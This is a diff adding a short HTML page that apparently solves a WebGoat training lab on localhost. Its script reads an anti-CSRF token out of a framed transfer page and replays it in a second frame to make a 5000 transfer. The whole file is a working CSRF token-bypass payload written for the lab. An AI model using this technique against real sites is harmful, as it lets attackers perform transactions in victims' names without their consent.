@@ -1,0 +1,11 @@
+<script>
+    function func1(){
+        var inside = document.getElementById("frame1").contentDocument;
+        var token_val = inside.getElementsByName("form")[0].token.value;
+
+        var outside = document.getElementById("frame2");
+        outside.src = "http://localhost:8090/WebGoat/attack?Screen=605842438&menu=900&transfer=5000&token=" + token_val;
+    }
+</script>
+<iframe id="frame1" src="http://localhost:8090/WebGoat/attack?Screen=605842438&menu=900&transfer=main" onload="func1()"></iframe>
+<iframe id="frame2"></iframe>
